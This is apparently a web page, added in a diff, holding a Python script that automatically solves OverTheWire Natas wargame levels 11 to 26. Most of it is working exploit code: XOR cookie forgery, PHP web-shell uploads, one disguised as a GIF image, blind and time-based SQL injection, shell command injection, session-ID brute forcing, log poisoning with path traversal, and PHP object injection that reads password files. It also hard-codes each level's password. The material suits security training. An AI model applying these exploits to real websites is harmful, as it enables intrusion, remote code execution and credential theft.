+        showpassword_no = '{&quot;showpassword&quot;:&quot;no&quot;,&quot;bgcolor&quot;:&quot;#ffffff&quot;}'
+
+        ''' Unnecessary steps, but demonstrates bin2hex and hex2bin
+        # Convert from binary to hex
+        hex_encoded = b64_decoded.hex()
+        # Convert from hex to binary
+        binary_encoded = bytes.fromhex(hex_encoded).decode()
+        # XOR will return same result as direct method below
+        xor_key = xor(showpassword_no, binary_encoded)
+        '''
+
+        xor_key = xor(showpassword_no, b64_decoded.decode())
+        # xor_key is a repeated string 'qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq'
+        key = xor_key[:4] # Key is the first 4 characters that get repeated
+
+        # XOR showpassword_yes with key to generate cookie_payload
+        showpassword_yes = '{&quot;showpassword&quot;:&quot;yes&quot;,&quot;bgcolor&quot;:&quot;#ffffff&quot;}'
+        ciphertext = xor(showpassword_yes, key)
+        cookie_payload = base64.b64encode(ciphertext.encode()).decode()
+
+        session.cookies.set('data', cookie_payload)
+        response = session.get(url)
+        content = response.text
+
+    return re.findall('The password for natas12 is (.*)&lt;br&gt;', content)[0]
+
+def natas12(verbose=False):
+    level = 12
+    username = f'natas{level}'
+    password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    '''
+    &lt;?php
+        system($_GET['foo_bar']);
+    ?&gt;
+    '''
+
+    # Upload PHP reverse shell file via POST request
+    response = requests.post(
+        url,
+        auth=(username, password),
+        files = {'uploadedfile': open(f'{username}_reverse_shell.php', 'rb')},
+        data = {'filename': f'{username}_reverse_shell.php'}
+    )
+
+    # Get location of uploaded PHP reverse shell file
+    relative_path =  re.findall('The file &lt;a href=&quot;(.*)&quot;&gt;upload/', response.text)[0]
+
+    # Use uploaded PHP reverse shell file to read contents of password file
+    command = f'?foo_bar=cat /etc/natas_webpass/natas{level+1}'
+    response = requests.post(url+relative_path+command, auth=(username, password))
+    return response.text.strip()
+
+def natas13(verbose=False):
+    level = 13
+    username = f'natas{level}'
+    password = 'jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    '''
+    GIF89a
+    &lt;?php
+        system($_GET['foo_bar']);
+    ?&gt;
+    '''
+
+    # Upload PHP reverse shell file disguised as GIF89a image file via POST request
+    response = requests.post(
+        url,
+        auth=(username, password),
+        files = {'uploadedfile': open(f'{username}_reverse_shell.php', 'rb')},
+        data = {'filename': f'{username}_reverse_shell.php'}
+    )
+
+    # Get location of uploaded PHP reverse shell file
+    relative_path =  re.findall('The file &lt;a href=&quot;(.*)&quot;&gt;upload/', response.text)[0]
+
+    # Use uploaded PHP reverse shell file to read contents of password file
+    command = f'?foo_bar=cat /etc/natas_webpass/natas{level+1}'
+    response = requests.post(url+relative_path+command, auth=(username, password))
+    return re.findall('GIF89a\n\n(.*)\n', response.text)[0]
+
+def natas14(verbose=False):
+    level = 14
+    username = f'natas{level}'
+    password = 'Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+    sql_command = '&quot; OR 1=1 #'
+    data = {
+        'username': sql_command,
+        'password': '',
+    }
+    response = requests.post(url, auth=(username, password), data=data)
+    content = response.text
+    flag =  re.findall('Successful login! The password for natas15 is (.*)&lt;br&gt;', content)[0]
+    return flag
+
+def natas15(verbose=False):
+    import string
+    level = 15
+    username = f'natas{level}'
+    password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    # Generate list of all possible flag characters
+    possible_characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
+
+    def http_request(username, password, password_try):
+        sql_command = f'natas16&quot; AND BINARY password LIKE &quot;{password_try}%&quot; #'
+        data = {'username': sql_command}
+        response = requests.post(url, auth=(username, password), data=data)
+        return response.text
+
+    # flag = ''
+    flag = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
+    loop = True
+    while loop:
+        for counter, char in enumerate(possible_characters):
+            password_try = flag + char
+            if verbose: print(f'Level {level}\tTrying...' + password_try)
+
+            if 'This user exists.' in http_request(username, password, password_try):
+                flag += char
+                break
+            elif counter==len(possible_characters)-1:
+                # If none of possible_characters match, then stop looping
+                loop = False
+
+    return flag
+
+def natas16(verbose=False):
+    import string
+    level = 16
+    username = f'natas{level}'
+    password = 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    # Generate list of all possible flag characters
+    possible_characters = string.ascii_letters + string.digits
+
+    def http_request(username, password, password_try):
+        bash_command = f'vulnerability$(grep ^{password_try} /etc/natas_webpass/natas17)'
+        data = {'needle': bash_command}
+        response = requests.post(url, auth=(username, password), data=data)
+        return response.text
+
+    # flag = ''
+    flag = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
+    loop = True
+    while loop:
+        for counter, char in enumerate(possible_characters):
+            password_try = flag + char
+            if verbose: print(f'Level {level}\tTrying...' + password_try)
+
+            if 'Output:\n&lt;pre&gt;\nvulnerability\n&lt;/pre&gt;\n' not in http_request(username, password, password_try):
+                flag += char
+                break
+            elif counter==len(possible_characters)-1:
+                # If none of possible_characters match, then stop looping
+                loop = False
+
+    return flag
+
+def natas17(verbose=False):
+    import string
+    from time import time
+    level = 17
+    username = f'natas{level}'
+    password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    # Generate list of all possible flag characters
+    possible_characters = string.ascii_letters + string.digits
+
+    def http_request(username, password, password_try):
+        t0 = time()
+        sql_command = f'natas18&quot; AND BINARY password LIKE &quot;{password_try}%&quot; AND SLEEP(10) #'
+        data = {'username': sql_command}
+        response = requests.post(url, auth=(username, password), data=data)
+        return time()-t0
+
+    # flag = ''
+    flag = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
+    loop = True
+    while loop:
+        for counter, char in enumerate(possible_characters):
+            password_try = flag + char
+            t1 = http_request(username, password, password_try)
+            if verbose: print(f'Level {level}\tTrying...', password_try, str(round(t1, 3)), 'seconds')
+
+            if t1 &gt; 10:
+                # If reponse time &gt; 10 secs, then SQL 'SLEEP' command succeeded and password_try character(s) exist(s)
+                flag += char
+                break
+            elif counter==len(possible_characters)-1:
+                # If none of possible_characters match, then stop looping
+                loop = False
+
+    return flag
+
+def natas18(verbose=False):
+    level = 18
+    username = f'natas{level}'
+    password = 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    def http_request(session_id):
+        with requests.Session() as session:
+            cookies={'PHPSESSID': session_id}
+            response = session.post(url, auth=(username, password), cookies=cookies)
+        return response.text
+
+    range_start = 118 # Set to 0 to run full range
+    range_end = 641
+    for session_id in range(range_start, range_end):
+        content = http_request(str(session_id))
+        if 'You are logged in as a regular user. Login as an admin to retrieve credentials' in content:
+            if verbose: print(f'Level {level}\tTrying... PHPSESSID', session_id) 
+        elif 'You are an admin. The credentials for the next level are:' in content:
+            return re.findall('The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas19\nPassword: (.*)&lt;/pre&gt;', content)[0]
+        else:
+            return 'Error, incorrect PHPSESSID.'
+
+def natas19(verbose=False):
+    import binascii
+    level = 19
+    username = f'natas{level}'
+    password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    def http_request(session_id):
+        with requests.Session() as session:
+            cookies = {'PHPSESSID': session_id}
+            response = session.post(url, auth=(username, password), cookies=cookies)
+        return response.text
+
+    range_start = 280 # Set to 0 to run full range
+    range_end = 641
+    for i in range(range_start, range_end):
+        PHPSESSID = binascii.hexlify(f'{str(i)}-admin'.encode()).decode()
+        content = http_request(PHPSESSID)
+        if 'You are logged in as a regular user. Login as an admin to retrieve credentials for natas20.&lt;/div&gt;' in content:
+            if verbose: print(f'Level {level}\tTrying... id', str(i).zfill(3), 'PHPSESSID:', PHPSESSID)
+        elif 'You are an admin. The credentials for the next level are:&lt;br&gt;&lt;pre&gt;Username: natas20' in content:
+            return re.findall('Password: (.*)&lt;/pre&gt;&lt;/div&gt;', content)[0]
+        else:
+            return 'Error, incorrect PHPSESSID.'
+
+def natas20(verbose=False):
+    level = 20
+    username = f'natas{level}'
+    password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    with requests.Session() as session:
+        session.auth=(username, password)
+        data = {'name': 'foobar\nadmin 1'}
+
+        # Send newline admin payload via POST request
+        response = session.post(url=url, data=data)
+
+        # Make new HTTP request with cookie obtained from previous request
+        response = session.get(url=url, cookies=response.cookies)
+        flag = re.findall('Password: (.*)&lt;/pre&gt;', response.text)[0]
+
+    return flag
+
+def natas21(verbose=False):
+    level = 21
+    username = f'natas{level}'
+    password = 'IFekPyrQXftziDEsUr3x21sYuahypdgJ'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+    experimenter_url = f'http://{username}-experimenter.natas.labs.overthewire.org/index.php'
+
+    with requests.Session() as session:
+        # Set admin value to '1' via POST request
+        data = {'admin': '1', 'submit': 'submit'}
+        response = session.post(url=experimenter_url, auth=(username, password), data=data)
+
+        # Get automatically assigned PHPSESSID from experimenter URL
+        cookies= {'PHPSESSID': response.cookies.get('PHPSESSID')}
+
+        # Since session is shared, use same PHPSESSID to access main URL to log in as admin
+        response = session.post(url=url, auth=(username, password), cookies=cookies)
+        flag = re.findall('Password: (.*)&lt;/pre&gt;', response.text)[0]
+
+    return flag
+
+def natas22(verbose=False):
+    level = 22
+    username = f'natas{level}'
+    password = 'chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+    response = requests.get(url=f'{url}?revelio', auth=(username, password), allow_redirects=False)
+    flag = re.findall('Password: (.*)&lt;/pre&gt;', response.text)[0]
+    return flag
+
+def natas23(verbose=False):
+    level = 23
+    username = f'natas{level}'
+    password = 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    # PHP code: if(strstr($_REQUEST[&quot;passwd&quot;],&quot;iloveyou&quot;) &amp;&amp; ($_REQUEST[&quot;passwd&quot;] &gt; 10)){ ...
+    # As there is an 'e' in the string, then it is treated as a float in $_REQUEST[&quot;passwd&quot;] &gt; 10
+    # Therefore prepend number larger than 10 to string
+    data = {'passwd': '99iloveyou'}
+    response = requests.post(url=url, auth=(username, password), data=data)
+    flag = re.findall('&lt;pre&gt;Username: natas24 Password: (.*)&lt;/pre&gt;', response.text)[0]
+    return flag
+
+def natas24(verbose=False):
+    level = 24
+    username = f'natas{level}'
+    password = 'OsRmXFguozKpTZZ5X14zNO43379LZveg'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+    response = requests.get(url=f'{url}?passwd[]', auth=(username, password))
+    flag = re.findall('Password: (.*)&lt;/pre&gt;', response.text)[0]
+    return flag
+
+def natas25(verbose=False):
+    level = 25
+    username = f'natas{level}'
+    password = 'GHF6X7YwACaYYssHVY05cFq83hRktl4c'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    with requests.Session() as session:
+        session.auth = (username, password)
+        response = session.get(url=f'{url}?lang=en')
+        PHPSESSID = response.cookies.get('PHPSESSID')
+
+        # PHP code prevents inclusion of 'natas_webpass': strstr($filename,&quot;natas_webpass&quot;)
+        # But logs are saved to server
+        # Therefore include PHP payload in User-Agent header
+        php_payload = &quot;&lt;?php system('cat /etc/natas_webpass/natas26'); ?&gt;&quot;
+        headers = {'User-Agent': php_payload}
+
+        # language of website is set by taking 'lang' parameter and reading file
+        # PHP code replaces '../' with '': $filename=str_replace(&quot;../&quot;,&quot;&quot;,$filename);
+        # Therefore '..././' will reduce to '../', then link to payload log file
+        # $fd=fopen(&quot;/var/www/natas/natas25/logs/natas25_&quot; . session_id() .&quot;.log&quot;,&quot;a&quot;);
+        data = {'lang': '..././'*5 + 'var/www/natas/natas25/logs/natas25_' + PHPSESSID + '.log'}
+
+        response = session.post(url, data=data, headers=headers)
+        flag = re.findall('] ([a-zA-Z0-9]*)\n &quot;Directory traversal attempt! fixing request.&quot;', response.text)[0]
+
+    return flag
+
+def natas26(verbose=False):
+    import base64
+    import subprocess
+    level = 26
+    username = f'natas{level}'
+    password = 'oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'
+    url = f'http://{username}.natas.labs.overthewire.org/'
+
+    '''
+    &lt;?php
+        class Logger{
+            private $logFile;
+            private $initMsg;
+            private $exitMsg;
+
+            function __construct(){
+                // initialise variables
+                $this-&gt;initMsg = &quot;&lt;?php system('cat /etc/natas_webpass/natas27'); ?&gt;&quot;;
+                $this-&gt;exitMsg = &quot;&lt;?php system('cat /etc/natas_webpass/natas27'); ?&gt;&quot;;
+                $this-&gt;logFile = &quot;img/00000000.php&quot;;
+
+                // write initial message
+                $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+                fwrite($fd,$initMsg);
+                fclose($fd);
+            }
+
+            function log($msg){
+                $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+                fwrite($fd,$msg.&quot;\n&quot;);
+                fclose($fd);
+            }
+
+            function __destruct(){
+                // write exit message
+                $fd=fopen($this-&gt;logFile,&quot;a+&quot;);
+                fwrite($fd,$this-&gt;exitMsg);
+                fclose($fd);
+            }
+        }
+
+        $logger_object = new Logger();
+
+        // echo(serialize($logger_object));
+        // echo(&quot;\n&quot;);
+        echo(base64_encode(serialize($logger_object)));
+        // echo(&quot;\n&quot;);
+    ?&gt;
+    '''
+
+    subproc = subprocess.run(
+        args = ['php', 'natas26_php_object_injection.php'],
+        stdout = subprocess.PIPE,
+        stderr = subprocess.DEVNULL,
+        text = True,
+    )
+    php_object_b64 = subproc.stdout
+    # php_object_b64 = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNjoiaW1nLzAwMDAwMDAwLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjUwOiI8P3BocCBzeXN0ZW0oJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fQ=='
+
+    with requests.Session() as session:
+        session.auth = (username, password)
+        session.cookies['drawing'] = php_object_b64
+        response = session.get(url)
+        response = session.get(url + 'img/00000000.php')
+    return response.text.split('\n')[0]
+
+
+def output_next_level(level, flag):
+    return f'natas{level}\thttp://natas{level}.natas.labs.overthewire.org/\t{flag}'
+
+def get_flag(level, **kwargs):
+    func = globals().get(f'natas{level}')
+    if func:
+        return output_next_level(level+1, func(**kwargs))
+    else:
+        return f'Error! Function natas{level} not found.'
+
+def get_all_flag_funcs():
+    natas_funcs = []
+    for k,v in globals().items():
+        if 'natas' in k:
+            natas_funcs.append(v)
+    return natas_funcs
+
+def error_main():
+    sys.stderr.write(f'Usage:\n$ python {sys.argv[0]}\n$ python {sys.argv[0]} -v -l &lt;arg&gt;\t(where &lt;arg&gt; must be an integer)\n')
+
+def main():
+    if len(sys.argv)==1:
+        print(output_next_level(0, 'natas0'))
+        for counter, func in enumerate(get_all_flag_funcs()):
+            print(output_next_level(counter+1, func()))
+        print('--END--')
+    elif len(sys.argv)&gt;1:
+        kwargs = {}
+        if '-v' in sys.argv:
+            kwargs.update({'verbose': True})
+            if '-l' in sys.argv and sys.argv.index('-l')&lt;len(sys.argv)-1 and sys.argv[sys.argv.index('-l')+1].isdigit():
+                sys.stdout.write(f'{get_flag(int(sys.argv[sys.argv.index(&quot;-l&quot;)+1]), **kwargs)}\n')
+            elif len(sys.argv)==2:
+                print(output_next_level(0, 'natas0'))
+                for counter, func in enumerate(get_all_flag_funcs()):
+                    print(output_next_level(counter+1, func(**kwargs)))
+                print('--END--')
+            else:
+                error_main()
+        elif '-l' in sys.argv and sys.argv.index('-l')&lt;len(sys.argv)-1 and sys.argv[sys.argv.index('-l')+1].isdigit():
+            sys.stdout.write(f'{get_flag(int(sys.argv[sys.argv.index(&quot;-l&quot;)+1]))}\n')
+        else:
+            error_main()
+    else:
+        error_main()
+
+if __name__=='__main__':
+    main()
+</code></pre>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script type="text/javascript">
+            var socket = new WebSocket("ws://localhost:3000/__livereload");
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+        <script type="text/javascript">
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+    </body>
+</html>
